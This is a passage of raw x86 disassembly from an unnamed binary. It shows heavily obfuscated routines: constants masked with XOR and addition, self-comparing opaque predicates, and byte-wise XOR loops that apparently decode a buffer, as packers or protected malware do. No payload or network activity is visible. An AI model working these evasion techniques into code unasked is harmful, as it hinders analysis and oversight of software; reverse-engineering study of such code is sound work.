  420923:	mov    DWORD PTR [ebp-0x8],eax
  420926:	mov    eax,DWORD PTR [ebp-0x44]
  420929:	mov    ecx,DWORD PTR [ebp-0x8]
  42092c:	xor    eax,ebx
  42092e:	add    eax,esi
  420930:	imul   eax,ecx
  420933:	mov    DWORD PTR [ebp-0x8],eax
  420936:	mov    eax,DWORD PTR [ebp-0x34]
  420939:	mov    ecx,DWORD PTR [ebp-0x8]
  42093c:	xor    eax,ebx
  42093e:	add    eax,esi
  420940:	cmp    ecx,eax
  420942:	je     0x420ab6
  420948:	mov    eax,DWORD PTR [ebp-0x8]
  42094b:	mov    DWORD PTR [ebp-0x14],eax
  42094e:	mov    eax,DWORD PTR [ebp-0xc]
  420951:	add    eax,DWORD PTR [ebp-0xd4]
  420957:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  42095e:	mov    DWORD PTR [ebp-0x20],edi
  420961:	mov    DWORD PTR [ebp-0xe8],0xf89c85bb
  42096b:	mov    DWORD PTR [ebp-0x8],eax
  42096e:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  420975:	mov    DWORD PTR [ebp-0x1c],edi
  420978:	mov    eax,DWORD PTR [ebp-0x24]
  42097b:	xor    eax,ebx
  42097d:	add    eax,esi
  42097f:	jmp    0x420a75
  420984:	mov    DWORD PTR [ebp-0xe0],0xf89c85a2
  42098e:	mov    DWORD PTR [ebp-0xc4],0xf89c85af
  420998:	mov    eax,DWORD PTR [ebp-0x1c]
  42099b:	mov    ecx,DWORD PTR [ebp-0x48]
  42099e:	xor    eax,ebx
  4209a0:	add    eax,esi
  4209a2:	imul   eax,ecx
  4209a5:	mov    ecx,DWORD PTR [ebp-0x8]
  4209a8:	mov    al,BYTE PTR [eax+ecx*1]
  4209ab:	mov    BYTE PTR [ebp-0x2],al
  4209ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4209b1:	mov    ecx,DWORD PTR [ebp-0x48]
  4209b4:	xor    eax,ebx
  4209b6:	add    eax,esi
  4209b8:	imul   eax,ecx
  4209bb:	mov    ecx,DWORD PTR [ebp-0xe8]
  4209c1:	xor    ecx,ebx
  4209c3:	add    eax,ecx
  4209c5:	mov    ecx,DWORD PTR [ebp-0x8]
  4209c8:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  4209d0:	mov    ecx,DWORD PTR [ebp-0xe0]
  4209d6:	xor    ecx,ebx
  4209d8:	lea    eax,[ecx+eax*1+0x3272fa]
  4209df:	movzx  ecx,BYTE PTR [ebp-0x2]
  4209e3:	xor    ecx,eax
  4209e5:	mov    BYTE PTR [ebp-0x2],cl
  4209e8:	mov    al,BYTE PTR [ebp-0x2]
  4209eb:	mov    ecx,DWORD PTR [ebp-0x1c]
  4209ee:	mov    edx,DWORD PTR [ebp-0x48]
  4209f1:	xor    ecx,ebx
  4209f3:	add    ecx,esi
  4209f5:	imul   ecx,edx
  4209f8:	mov    edx,DWORD PTR [ebp-0x8]
  4209fb:	mov    BYTE PTR [ecx+edx*1],al
  4209fe:	mov    eax,DWORD PTR [ebp-0x1c]
  420a01:	mov    ecx,DWORD PTR [ebp-0x48]
  420a04:	xor    eax,ebx
  420a06:	add    eax,esi
  420a08:	imul   eax,ecx
  420a0b:	mov    ecx,DWORD PTR [ebp-0x8]
  420a0e:	mov    al,BYTE PTR [eax+ecx*1]
  420a11:	mov    BYTE PTR [ebp-0x2],al
  420a14:	mov    eax,DWORD PTR [ebp-0x1c]
  420a17:	mov    ecx,DWORD PTR [ebp-0x48]
  420a1a:	xor    eax,ebx
  420a1c:	add    eax,esi
  420a1e:	imul   eax,ecx
  420a21:	mov    ecx,DWORD PTR [ebp-0x20]
  420a24:	xor    ecx,ebx
  420a26:	add    eax,ecx
  420a28:	mov    ecx,DWORD PTR [ebp-0x8]
  420a2b:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420a33:	mov    ecx,DWORD PTR [ebp-0xc4]
  420a39:	xor    ecx,ebx
  420a3b:	lea    eax,[ecx+eax*1+0x3272fa]
  420a42:	movzx  ecx,BYTE PTR [ebp-0x2]
  420a46:	xor    ecx,eax
  420a48:	mov    BYTE PTR [ebp-0x2],cl
  420a4b:	mov    al,BYTE PTR [ebp-0x2]
  420a4e:	mov    ecx,DWORD PTR [ebp-0x1c]
  420a51:	mov    edx,DWORD PTR [ebp-0x48]
  420a54:	xor    ecx,ebx
  420a56:	add    ecx,esi
  420a58:	imul   ecx,edx
  420a5b:	mov    edx,DWORD PTR [ebp-0x8]
  420a5e:	mov    BYTE PTR [ecx+edx*1],al
  420a61:	mov    eax,DWORD PTR [ebp-0x38]
  420a64:	mov    ecx,DWORD PTR [ebp-0x20]
  420a67:	xor    eax,ebx
  420a69:	xor    ecx,ebx
  420a6b:	add    eax,esi
  420a6d:	add    ecx,esi
  420a6f:	imul   eax,ecx
  420a72:	add    eax,DWORD PTR [ebp-0x48]
  420a75:	mov    DWORD PTR [ebp-0x48],eax
  420a78:	mov    eax,DWORD PTR [ebp-0x48]
  420a7b:	mov    ecx,DWORD PTR [ebp-0x14]
  420a7e:	cmp    ecx,eax
  420a80:	jb     0x420984
  420a86:	mov    eax,DWORD PTR [ebp-0x20]
  420a89:	mov    ecx,DWORD PTR [ebp-0x14]
  420a8c:	xor    eax,ebx
  420a8e:	add    eax,esi
  420a90:	imul   eax,ecx
  420a93:	mov    ecx,DWORD PTR [ebp-0x24]
  420a96:	xor    ecx,ebx
  420a98:	add    ecx,esi
  420a9a:	or     eax,ecx
  420a9c:	mov    ecx,DWORD PTR [ebp-0x30]
  420a9f:	xor    ecx,ebx
  420aa1:	add    eax,ecx
  420aa3:	mov    ecx,DWORD PTR [ebp-0x30]
  420aa6:	xor    ecx,ebx
  420aa8:	add    eax,ecx
  420aaa:	mov    ecx,DWORD PTR [ebp-0xc]
  420aad:	lea    eax,[eax+ecx*1+0x64e5f4]
  420ab4:	jmp    0x420ac5
  420ab6:	mov    eax,DWORD PTR [ebp-0x30]
  420ab9:	mov    ecx,DWORD PTR [ebp-0xc]
  420abc:	xor    eax,ebx
  420abe:	lea    eax,[eax+ecx*1+0x3272fa]
  420ac5:	mov    DWORD PTR [ebp-0xc],eax
  420ac8:	mov    eax,DWORD PTR [ebp-0x30]
  420acb:	xor    eax,ebx
  420acd:	mov    ecx,0xffcd8d06
  420ad2:	sub    ecx,eax
  420ad4:	add    ecx,DWORD PTR [ebp-0x28]
  420ad7:	mov    eax,DWORD PTR [ebp-0x30]
  420ada:	mov    edx,DWORD PTR [ebp-0xc]
  420add:	xor    eax,ebx
  420adf:	add    eax,esi
  420ae1:	imul   eax,edx
  420ae4:	cmp    eax,ecx
  420ae6:	jbe    0x4208f8
  420aec:	mov    eax,DWORD PTR [ebp-0x10]
  420aef:	mov    ecx,DWORD PTR [ebp-0x3c]
  420af2:	mov    eax,DWORD PTR [ebp+0x8]
  420af5:	mov    edx,DWORD PTR [ebp-0x54]
  420af8:	mov    eax,DWORD PTR [eax+0x1e0]
  420afe:	xor    edx,ebx
  420b00:	add    edx,esi
  420b02:	push   edx
  420b03:	mov    edx,DWORD PTR [ebp-0x40]
  420b06:	xor    edx,ebx
  420b08:	add    edx,esi
  420b0a:	push   edx
  420b0b:	push   ecx
  420b0c:	mov    DWORD PTR [ebp-0x38],ecx
  420b0f:	mov    ecx,DWORD PTR [ebp-0x10]
  420b12:	xor    ecx,ebx
  420b14:	add    ecx,esi
  420b16:	push   ecx
  420b17:	call   DWORD PTR [eax+0x14]
  420b1a:	mov    edi,eax
  420b1c:	mov    eax,DWORD PTR [ebp-0x10]
  420b1f:	xor    eax,ebx
  420b21:	add    eax,esi
  420b23:	cmp    eax,edi
  420b25:	je     0x420b80
  420b27:	mov    eax,DWORD PTR [ebp-0x10]
  420b2a:	jmp    0x420b4d
  420b2c:	mov    ecx,DWORD PTR [ebp-0x2c]
  420b2f:	xor    eax,ebx
  420b31:	mov    cl,BYTE PTR [ecx+eax*1+0x3272fa]
  420b38:	mov    BYTE PTR [eax+edi*1+0x3272fa],cl
  420b3f:	mov    ecx,DWORD PTR [ebp-0x18]
  420b42:	xor    ecx,ebx
  420b44:	lea    eax,[ecx+eax*1+0x3272fa]
  420b4b:	xor    eax,ebx
  420b4d:	mov    ecx,DWORD PTR [ebp-0x3c]
  420b50:	sub    ecx,esi
  420b52:	xor    ecx,ebx
  420b54:	cmp    eax,ecx
  420b56:	jne    0x420b2c
  420b58:	mov    eax,DWORD PTR [ebp+0x8]
  420b5b:	mov    ecx,DWORD PTR [ebp-0x50]
  420b5e:	mov    eax,DWORD PTR [eax+0x1e0]
  420b64:	xor    ecx,ebx
  420b66:	add    ecx,esi
  420b68:	push   ecx
  420b69:	mov    ecx,DWORD PTR [ebp-0x10]
  420b6c:	xor    ecx,ebx
  420b6e:	add    ecx,esi
  420b70:	push   ecx
  420b71:	push   DWORD PTR [ebp-0x2c]
  420b74:	call   DWORD PTR [eax+0x18]
  420b77:	mov    eax,DWORD PTR [ebp-0x38]
  420b7a:	mov    DWORD PTR [ebp-0x2c],edi
  420b7d:	mov    DWORD PTR [ebp-0x3c],eax
  420b80:	mov    eax,DWORD PTR [ebp-0x2c]
  420b83:	mov    DWORD PTR [ebp-0x14],eax
  420b86:	mov    eax,DWORD PTR [ebp-0x18]
  420b89:	mov    ecx,DWORD PTR [ebp-0x10]
  420b8c:	xor    eax,ebx
  420b8e:	add    eax,esi
  420b90:	mov    DWORD PTR [ebp-0x5c],0xbad3cbd3
  420b97:	mov    DWORD PTR [ebp-0x58],0xc4d3bcd3
  420b9e:	jmp    0x420bd1
  420ba0:	mov    edx,DWORD PTR [ebp-0x14]
  420ba3:	mov    edi,ecx
  420ba5:	xor    edi,ebx
  420ba7:	mov    cl,BYTE PTR [ebp+edi*1+0x32729e]
  420bae:	movsx  edx,BYTE PTR [edi+edx*1+0x3272fa]
  420bb6:	xor    cl,0x81
  420bb9:	add    cl,0x6
  420bbc:	movzx  ecx,cl
  420bbf:	cmp    edx,ecx
  420bc1:	jne    0x420bdb
  420bc3:	mov    ecx,DWORD PTR [ebp-0x18]
  420bc6:	xor    ecx,ebx
  420bc8:	lea    ecx,[ecx+edi*1+0x3272fa]
  420bcf:	xor    ecx,ebx
  420bd1:	cmp    ecx,0xf89c85bd
  420bd7:	jne    0x420ba0
  420bd9:	jmp    0x420be2
  420bdb:	mov    eax,DWORD PTR [ebp-0x10]
  420bde:	xor    eax,ebx
  420be0:	add    eax,esi
  420be2:	mov    ecx,DWORD PTR [ebp-0x10]
  420be5:	xor    ecx,ebx
  420be7:	add    ecx,esi
  420be9:	cmp    ecx,eax
  420beb:	je     0x420d61
  420bf1:	mov    eax,DWORD PTR [ebp-0x14]
  420bf4:	mov    eax,DWORD PTR [eax+0x8]
  420bf7:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  420bfe:	mov    DWORD PTR [ebp-0x40],0xf89cc3c6
  420c05:	mov    DWORD PTR [ebp-0x44],0xf89cb5b5
  420c0c:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  420c13:	mov    DWORD PTR [ebp-0x20],eax
  420c16:	mov    eax,DWORD PTR [ebp+0x8]
  420c19:	mov    ecx,DWORD PTR [ebp-0x24]
  420c1c:	xor    ecx,ebx
  420c1e:	add    ecx,esi
  420c20:	push   ecx
  420c21:	mov    ecx,DWORD PTR [ebp-0x44]
  420c24:	mov    eax,DWORD PTR [eax+0x1e0]
  420c2a:	xor    ecx,ebx
  420c2c:	add    ecx,esi
  420c2e:	push   ecx
  420c2f:	mov    ecx,DWORD PTR [ebp-0x40]
  420c32:	xor    ecx,ebx
  420c34:	add    ecx,esi
  420c36:	push   ecx
  420c37:	mov    ecx,DWORD PTR [ebp-0xc]
  420c3a:	xor    ecx,ebx
  420c3c:	add    ecx,esi
  420c3e:	push   ecx
  420c3f:	call   DWORD PTR [eax+0x14]
  420c42:	mov    edi,eax
  420c44:	mov    eax,DWORD PTR [ebp+0x8]
  420c47:	mov    ecx,DWORD PTR [ebp-0x24]
  420c4a:	mov    eax,DWORD PTR [eax+0x1e0]
  420c50:	xor    ecx,ebx
  420c52:	add    ecx,esi
  420c54:	push   ecx
  420c55:	mov    ecx,DWORD PTR [ebp-0x44]
  420c58:	xor    ecx,ebx
  420c5a:	add    ecx,esi
  420c5c:	push   ecx
  420c5d:	mov    ecx,DWORD PTR [ebp-0xc]
  420c60:	push   DWORD PTR [ebp-0x20]
  420c63:	xor    ecx,ebx
  420c65:	add    ecx,esi
  420c67:	push   ecx
  420c68:	call   DWORD PTR [eax+0x14]
  420c6b:	mov    ecx,DWORD PTR [ebp-0xc]
  420c6e:	xor    ecx,ebx
  420c70:	add    ecx,esi
  420c72:	mov    DWORD PTR [ebp-0x24],eax
  420c75:	cmp    ecx,edi
  420c77:	je     0x421004
  420c7d:	mov    ecx,DWORD PTR [ebp-0xc]
  420c80:	xor    ecx,ebx
  420c82:	add    ecx,esi
  420c84:	cmp    ecx,eax
  420c86:	je     0x421004
  420c8c:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  420c93:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  420c9a:	mov    ecx,DWORD PTR [ebp-0x40]
  420c9d:	xor    cl,0xb3
  420ca0:	sub    cl,0x6
  420ca3:	mov    BYTE PTR [edi],cl
  420ca5:	mov    ecx,DWORD PTR [ebp-0xc]
  420ca8:	xor    cl,0xb3
  420cab:	sub    cl,0x6
  420cae:	mov    BYTE PTR [edi+0x1],cl
  420cb1:	mov    ecx,DWORD PTR [ebp-0x54]
  420cb4:	xor    cl,0xb3
  420cb7:	sub    cl,0x6
  420cba:	mov    BYTE PTR [edi+0x2],cl
  420cbd:	and    DWORD PTR [ebp-0xc8],0x0
  420cc4:	and    DWORD PTR [ebp-0xdc],0x0
  420ccb:	lea    ecx,[ebp-0xdc]
  420cd1:	push   ecx
  420cd2:	push   DWORD PTR [ebp-0x20]
  420cd5:	push   eax
  420cd6:	lea    eax,[ebp-0xc8]
  420cdc:	push   eax
  420cdd:	mov    eax,DWORD PTR [ebp-0x14]
  420ce0:	push   DWORD PTR [eax+0xc]
  420ce3:	mov    eax,DWORD PTR [ebp-0x2c]
  420ce6:	add    eax,0x10
  420ce9:	push   eax
  420cea:	push   edi
  420ceb:	call   0x41ff8f
  420cf0:	mov    DWORD PTR [ebp-0x40],eax
  420cf3:	mov    eax,DWORD PTR [ebp+0x8]
  420cf6:	mov    ecx,DWORD PTR [ebp-0x50]
  420cf9:	mov    eax,DWORD PTR [eax+0x1e0]
  420cff:	xor    ecx,ebx
  420d01:	add    ecx,esi
  420d03:	push   ecx
  420d04:	mov    ecx,DWORD PTR [ebp-0xc]
  420d07:	xor    ecx,ebx
  420d09:	add    ecx,esi
  420d0b:	push   ecx
  420d0c:	push   edi
  420d0d:	call   DWORD PTR [eax+0x18]
  420d10:	mov    eax,DWORD PTR [ebp-0x40]
  420d13:	add    eax,0xffcd8d06
  420d18:	xor    eax,ebx
  420d1a:	cmp    eax,0xf89c85b5
  420d1f:	mov    eax,DWORD PTR [ebp+0x8]
  420d22:	mov    eax,DWORD PTR [eax+0x1e0]
  420d28:	mov    ecx,DWORD PTR [ebp-0x50]
  420d2b:	jne    0x420d4e
  420d2d:	xor    ecx,ebx
  420d2f:	add    ecx,esi
  420d31:	push   ecx
  420d32:	mov    ecx,DWORD PTR [ebp-0xc]
  420d35:	xor    ecx,ebx
  420d37:	add    ecx,esi
  420d39:	push   ecx
  420d3a:	push   DWORD PTR [ebp-0x2c]
  420d3d:	call   DWORD PTR [eax+0x18]
  420d40:	mov    eax,DWORD PTR [ebp-0x24]
  420d43:	mov    DWORD PTR [ebp-0x2c],eax
  420d46:	mov    eax,DWORD PTR [ebp-0x20]
  420d49:	mov    DWORD PTR [ebp-0x3c],eax
  420d4c:	jmp    0x420d61
  420d4e:	xor    ecx,ebx
  420d50:	add    ecx,esi
  420d52:	push   ecx
  420d53:	mov    ecx,DWORD PTR [ebp-0xc]
  420d56:	xor    ecx,ebx
  420d58:	add    ecx,esi
  420d5a:	push   ecx
  420d5b:	push   DWORD PTR [ebp-0x24]
  420d5e:	call   DWORD PTR [eax+0x18]
  420d61:	mov    eax,DWORD PTR [ebp-0x3c]
  420d64:	mov    DWORD PTR [ebp-0x34],eax
  420d67:	mov    eax,DWORD PTR [ebp-0x2c]
  420d6a:	mov    DWORD PTR [ebp-0x28],0xf89c85b5
  420d71:	mov    DWORD PTR [ebp-0x40],eax
  420d74:	mov    edi,0xf89c85b4
  420d79:	mov    DWORD PTR [ebp-0x30],edi
  420d7c:	mov    eax,DWORD PTR [ebp-0x28]
  420d7f:	xor    eax,ebx
  420d81:	add    eax,esi
  420d83:	mov    DWORD PTR [ebp-0xc],eax
  420d86:	mov    eax,DWORD PTR [ebp-0x28]
  420d89:	xor    eax,ebx
  420d8b:	add    eax,esi
  420d8d:	mov    DWORD PTR [ebp-0x14],eax
  420d90:	mov    DWORD PTR [ebp-0x44],0xf89c8595
  420d97:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  420d9e:	mov    eax,DWORD PTR [ebp-0x28]
  420da1:	mov    ecx,DWORD PTR [ebp-0x34]
  420da4:	xor    eax,ebx
  420da6:	add    eax,esi
  420da8:	cmp    ecx,eax
  420daa:	je     0x420fa0
  420db0:	jmp    0x420f7c
  420db5:	mov    ecx,DWORD PTR [ebp-0xc]
  420db8:	mov    eax,DWORD PTR [ebp-0x34]
  420dbb:	sub    eax,ecx
  420dbd:	mov    ecx,DWORD PTR [ebp-0x44]
  420dc0:	xor    ecx,ebx
  420dc2:	add    ecx,esi
  420dc4:	xor    edx,edx
  420dc6:	div    ecx
  420dc8:	mov    DWORD PTR [ebp-0x14],eax
  420dcb:	mov    eax,DWORD PTR [ebp-0x24]
  420dce:	mov    ecx,DWORD PTR [ebp-0x14]
  420dd1:	xor    eax,ebx
  420dd3:	add    eax,esi
  420dd5:	cmp    ecx,eax
  420dd7:	jbe    0x420de3
  420dd9:	mov    eax,DWORD PTR [ebp-0x24]
  420ddc:	xor    eax,ebx
  420dde:	add    eax,esi
  420de0:	mov    DWORD PTR [ebp-0x14],eax
  420de3:	mov    eax,DWORD PTR [ebp-0x44]
  420de6:	mov    ecx,DWORD PTR [ebp-0x14]
  420de9:	xor    eax,ebx
  420deb:	add    eax,esi
  420ded:	imul   eax,ecx
  420df0:	mov    DWORD PTR [ebp-0x14],eax
  420df3:	mov    eax,DWORD PTR [ebp-0x28]
  420df6:	mov    ecx,DWORD PTR [ebp-0x14]
  420df9:	xor    eax,ebx
  420dfb:	add    eax,esi
  420dfd:	cmp    ecx,eax
  420dff:	je     0x420f6a
  420e05:	mov    eax,DWORD PTR [ebp-0x14]
  420e08:	mov    DWORD PTR [ebp-0x20],eax
  420e0b:	mov    eax,DWORD PTR [ebp-0xc]
  420e0e:	add    eax,DWORD PTR [ebp-0x40]
  420e11:	mov    DWORD PTR [ebp-0x4c],0xf89c85b5
  420e18:	mov    DWORD PTR [ebp-0x14],edi
  420e1b:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  420e22:	mov    DWORD PTR [ebp-0x1c],eax
  420e25:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  420e2c:	mov    DWORD PTR [ebp-0x8],edi
  420e2f:	mov    eax,DWORD PTR [ebp-0x4c]
  420e32:	xor    eax,ebx
  420e34:	add    eax,esi
  420e36:	jmp    0x420f29
  420e3b:	mov    DWORD PTR [ebp-0xe4],0xf89c85a2
  420e45:	mov    DWORD PTR [ebp-0xd0],0xf89c85af
  420e4f:	mov    eax,DWORD PTR [ebp-0x8]
  420e52:	mov    ecx,DWORD PTR [ebp-0x18]
  420e55:	xor    eax,ebx
  420e57:	add    eax,esi
  420e59:	imul   eax,ecx
  420e5c:	mov    ecx,DWORD PTR [ebp-0x1c]
  420e5f:	mov    al,BYTE PTR [eax+ecx*1]
  420e62:	mov    BYTE PTR [ebp-0x1],al
  420e65:	mov    eax,DWORD PTR [ebp-0x8]
  420e68:	mov    ecx,DWORD PTR [ebp-0x18]
  420e6b:	xor    eax,ebx
  420e6d:	add    eax,esi
  420e6f:	imul   eax,ecx
  420e72:	mov    ecx,DWORD PTR [ebp-0x54]
  420e75:	xor    ecx,ebx
  420e77:	add    eax,ecx
  420e79:	mov    ecx,DWORD PTR [ebp-0x1c]
  420e7c:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420e84:	mov    ecx,DWORD PTR [ebp-0xe4]
  420e8a:	xor    ecx,ebx
  420e8c:	lea    eax,[ecx+eax*1+0x3272fa]
  420e93:	movzx  ecx,BYTE PTR [ebp-0x1]
  420e97:	xor    ecx,eax
  420e99:	mov    BYTE PTR [ebp-0x1],cl
  420e9c:	mov    al,BYTE PTR [ebp-0x1]
  420e9f:	mov    ecx,DWORD PTR [ebp-0x8]
  420ea2:	mov    edx,DWORD PTR [ebp-0x18]
  420ea5:	xor    ecx,ebx
  420ea7:	add    ecx,esi
  420ea9:	imul   ecx,edx
  420eac:	mov    edx,DWORD PTR [ebp-0x1c]
  420eaf:	mov    BYTE PTR [ecx+edx*1],al
  420eb2:	mov    eax,DWORD PTR [ebp-0x8]
  420eb5:	mov    ecx,DWORD PTR [ebp-0x18]
  420eb8:	xor    eax,ebx
  420eba:	add    eax,esi
  420ebc:	imul   eax,ecx
  420ebf:	mov    ecx,DWORD PTR [ebp-0x1c]
  420ec2:	mov    al,BYTE PTR [eax+ecx*1]
  420ec5:	mov    BYTE PTR [ebp-0x1],al
  420ec8:	mov    eax,DWORD PTR [ebp-0x8]
  420ecb:	mov    ecx,DWORD PTR [ebp-0x18]
  420ece:	xor    eax,ebx
  420ed0:	add    eax,esi
  420ed2:	imul   eax,ecx
  420ed5:	mov    ecx,DWORD PTR [ebp-0x14]
  420ed8:	xor    ecx,ebx
  420eda:	add    eax,ecx
  420edc:	mov    ecx,DWORD PTR [ebp-0x1c]
  420edf:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420ee7:	mov    ecx,DWORD PTR [ebp-0xd0]
  420eed:	xor    ecx,ebx
  420eef:	lea    eax,[ecx+eax*1+0x3272fa]
  420ef6:	movzx  ecx,BYTE PTR [ebp-0x1]
  420efa:	xor    ecx,eax
  420efc:	mov    BYTE PTR [ebp-0x1],cl
  420eff:	mov    al,BYTE PTR [ebp-0x1]
  420f02:	mov    ecx,DWORD PTR [ebp-0x8]
  420f05:	mov    edx,DWORD PTR [ebp-0x18]
  420f08:	xor    ecx,ebx
  420f0a:	add    ecx,esi
  420f0c:	imul   ecx,edx
  420f0f:	mov    edx,DWORD PTR [ebp-0x1c]
  420f12:	mov    BYTE PTR [ecx+edx*1],al
  420f15:	mov    eax,DWORD PTR [ebp-0x38]
  420f18:	mov    ecx,DWORD PTR [ebp-0x14]
  420f1b:	xor    eax,ebx
  420f1d:	xor    ecx,ebx
  420f1f:	add    eax,esi
  420f21:	add    ecx,esi
  420f23:	imul   eax,ecx
  420f26:	add    eax,DWORD PTR [ebp-0x18]
  420f29:	mov    DWORD PTR [ebp-0x18],eax
  420f2c:	mov    eax,DWORD PTR [ebp-0x18]
  420f2f:	mov    ecx,DWORD PTR [ebp-0x20]
  420f32:	cmp    ecx,eax
  420f34:	jb     0x420e3b
  420f3a:	mov    eax,DWORD PTR [ebp-0x14]
  420f3d:	mov    ecx,DWORD PTR [ebp-0x20]
  420f40:	xor    eax,ebx
  420f42:	add    eax,esi
  420f44:	imul   eax,ecx
  420f47:	mov    ecx,DWORD PTR [ebp-0x4c]
  420f4a:	xor    ecx,ebx
  420f4c:	add    ecx,esi
  420f4e:	or     eax,ecx
  420f50:	mov    ecx,DWORD PTR [ebp-0x30]
  420f53:	xor    ecx,ebx
  420f55:	add    eax,ecx
  420f57:	mov    ecx,DWORD PTR [ebp-0x30]
  420f5a:	xor    ecx,ebx
  420f5c:	add    eax,ecx
  420f5e:	mov    ecx,DWORD PTR [ebp-0xc]
  420f61:	lea    eax,[eax+ecx*1+0x64e5f4]
  420f68:	jmp    0x420f79
  420f6a:	mov    eax,DWORD PTR [ebp-0x30]
  420f6d:	mov    ecx,DWORD PTR [ebp-0xc]
  420f70:	xor    eax,ebx
  420f72:	lea    eax,[eax+ecx*1+0x3272fa]
  420f79:	mov    DWORD PTR [ebp-0xc],eax
  420f7c:	mov    eax,DWORD PTR [ebp-0x30]
  420f7f:	xor    eax,ebx
  420f81:	mov    ecx,0xffcd8d06
  420f86:	sub    ecx,eax
  420f88:	add    ecx,DWORD PTR [ebp-0x34]
  420f8b:	mov    eax,DWORD PTR [ebp-0x30]
  420f8e:	mov    edx,DWORD PTR [ebp-0xc]
  420f91:	xor    eax,ebx
  420f93:	add    eax,esi
  420f95:	imul   eax,edx
  420f98:	cmp    eax,ecx
  420f9a:	jbe    0x420db5
  420fa0:	push   DWORD PTR [ebp+0x8]
  420fa3:	mov    eax,DWORD PTR [ebp+0x8]
  420fa6:	push   DWORD PTR [eax+0x1cc]
  420fac:	lea    eax,[ebp-0xd8]
  420fb2:	push   eax
  420fb3:	mov    eax,DWORD PTR [ebp+0x8]
  420fb6:	mov    eax,DWORD PTR [eax+0x1c4]
  420fbc:	push   DWORD PTR [eax]
  420fbe:	mov    eax,DWORD PTR [ebp+0x8]
  420fc1:	mov    eax,DWORD PTR [eax+0x1c0]
  420fc7:	push   DWORD PTR [eax]
  420fc9:	push   DWORD PTR [ebp-0x3c]
  420fcc:	push   DWORD PTR [ebp-0x2c]
  420fcf:	call   0x421a66
  420fd4:	mov    DWORD PTR [ebp-0x40],eax
  420fd7:	mov    eax,DWORD PTR [ebp-0x10]
  420fda:	mov    ecx,DWORD PTR [ebp-0x2c]
  420fdd:	xor    eax,ebx
  420fdf:	add    eax,esi
  420fe1:	cmp    eax,ecx
  420fe3:	je     0x421004
  420fe5:	mov    eax,DWORD PTR [ebp+0x8]
  420fe8:	mov    ecx,DWORD PTR [ebp-0x50]
  420feb:	mov    eax,DWORD PTR [eax+0x1e0]
  420ff1:	xor    ecx,ebx
  420ff3:	add    ecx,esi
  420ff5:	push   ecx
  420ff6:	mov    ecx,DWORD PTR [ebp-0x10]
  420ff9:	xor    ecx,ebx
  420ffb:	add    ecx,esi
  420ffd:	push   ecx
  420ffe:	push   DWORD PTR [ebp-0x2c]
  421001:	call   DWORD PTR [eax+0x18]
  421004:	pop    edi
  421005:	pop    esi
  421006:	pop    ebx
  421007:	leave  
  421008:	ret    0x4
  42100b:	push   ebp
  42100c:	mov    ebp,esp
  42100e:	push   ecx
  42100f:	push   ecx
  421010:	lea    eax,[ebp-0x8]
  421013:	mov    DWORD PTR [ebp-0x4],eax
  421016:	push   esi
  421017:	mov    esi,DWORD PTR [ebp-0x4]
  42101a:	mov    eax,0xf881bacf
  42101f:	mov    DWORD PTR [esi],eax
  421021:	mov    esi,DWORD PTR [ebp-0x8]
  421024:	cmp    esi,eax
  421026:	pop    esi
  421027:	jne    0x421031
  421029:	mov    BYTE PTR [ecx+0xa],0x7b
  42102d:	mov    BYTE PTR [edx+0x8],0xcc
  421031:	mov    BYTE PTR [edx+0xa],0x7b
  421035:	mov    BYTE PTR [ecx+0x2],0xe9
  421039:	leave  
  42103a:	ret    
  42103b:	push   ebp
  42103c:	mov    ebp,esp
  42103e:	push   ecx
  42103f:	push   ecx
  421040:	lea    eax,[ebp-0x8]
  421043:	mov    DWORD PTR [ebp-0x4],eax
  421046:	mov    edx,DWORD PTR [ebp-0x4]
  421049:	mov    eax,0xf88b0bd3
  42104e:	mov    DWORD PTR [edx],eax
  421050:	mov    edx,DWORD PTR [ebp-0x8]
  421053:	cmp    edx,eax
  421055:	jne    0x421066
  421057:	mov    eax,DWORD PTR [ebp+0x8]
  42105a:	mov    BYTE PTR [ecx+0x9],0xef
  42105e:	mov    BYTE PTR [eax+0x7],0xa4
  421062:	mov    BYTE PTR [ecx+0x6],0xec
  421066:	mov    BYTE PTR [ecx+0x3],0xdf
  42106a:	leave  
  42106b:	ret    0x4
  42106e:	push   ebp
  42106f:	mov    ebp,esp
  421071:	push   ecx
  421072:	push   ecx
  421073:	lea    eax,[ebp-0x8]
  421076:	mov    DWORD PTR [ebp-0x4],eax
  421079:	mov    edx,DWORD PTR [ebp-0x4]
  42107c:	mov    eax,0x7e0dacf
  421081:	mov    DWORD PTR [edx],eax
  421083:	mov    edx,DWORD PTR [ebp-0x8]
  421086:	cmp    edx,eax
  421088:	jne    0x42108e
  42108a:	mov    BYTE PTR [ecx+0x7],0xa4
  42108e:	mov    eax,DWORD PTR [ebp+0x8]
  421091:	mov    BYTE PTR [ecx+0x1],0xe2
  421095:	mov    BYTE PTR [eax+0x9],0xcf
  421099:	leave  
  42109a:	ret    0x4
  42109d:	push   ebp
  42109e:	mov    ebp,esp
  4210a0:	push   ecx
  4210a1:	push   ecx
  4210a2:	lea    eax,[ebp-0x8]
  4210a5:	mov    DWORD PTR [ebp-0x4],eax
  4210a8:	push   esi
  4210a9:	mov    esi,DWORD PTR [ebp-0x4]
  4210ac:	mov    eax,0x7060e3e
  4210b1:	mov    DWORD PTR [esi],eax
  4210b3:	mov    esi,DWORD PTR [ebp-0x8]
  4210b6:	cmp    esi,eax
  4210b8:	pop    esi
  4210b9:	jne    0x4210c5
  4210bb:	mov    BYTE PTR [edx+0x4],0xe8
  4210bf:	mov    WORD PTR [ecx+0x3],0xe8df
  4210c5:	mov    BYTE PTR [edx],0xbc
  4210c8:	leave  
  4210c9:	ret    
  4210ca:	push   ebp
  4210cb:	mov    ebp,esp
  4210cd:	push   ecx
  4210ce:	push   ecx
  4210cf:	lea    eax,[ebp-0x8]
  4210d2:	mov    DWORD PTR [ebp-0x4],eax
  4210d5:	mov    edx,DWORD PTR [ebp-0x4]
